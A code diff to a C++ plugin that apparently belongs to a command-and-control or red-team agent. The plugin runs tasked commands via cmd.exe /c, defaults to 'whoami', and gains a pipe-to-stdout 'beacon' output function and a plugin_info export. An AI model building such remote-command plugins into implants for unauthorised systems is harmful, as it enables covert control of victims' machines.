@@ -2,6 +2,19 @@
 #include <new>
 #include "../../Include/IPlugin.h"
 
+static void BeaconPipeOutput(HANDLE hRead) {
+    BYTE buf[4096];
+    for (;;) {
+        DWORD got = 0;
+        if (!ReadFile(hRead, buf, sizeof(buf), &got, nullptr) || got == 0) break;
+        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+        if (hOut && hOut != INVALID_HANDLE_VALUE) {
+            DWORD wrote = 0;
+            WriteFile(hOut, buf, got, &wrote, nullptr);
+        }
+    }
+}
+
 static DWORD RunCommand(const char* cmd, DWORD cmdLen, const WinApiTable* api = nullptr) {
     static const char kDefault[] = "whoami";
     if (!cmd || cmdLen == 0) {
@@ -69,7 +82,6 @@ class CmdPlugin : public IPlugin {
     const WinApiTable* m_api;
 public:
     explicit CmdPlugin(const WinApiTable* api) : m_api(api) {}
-    const WinApiTable* api() const { return m_api; }
     void init()    const override {}
     void cleanup() const override {}
     void execute(TaskApi* task) const override {
@@ -113,4 +125,8 @@ extern "C" void __stdcall plugin_exec(TaskApi* task) {
 extern "C" void __stdcall plugin_cleanup(IPlugin* p) {
     if (!p) p = g_plugin;
     if (p) p->cleanup();
+}
+
+PLUGIN_EXPORT PluginInfo PLUGIN_CALL plugin_info() {
+    return { "cmd", "2.0.3", "Command execution via cmd.exe /c" };
 }
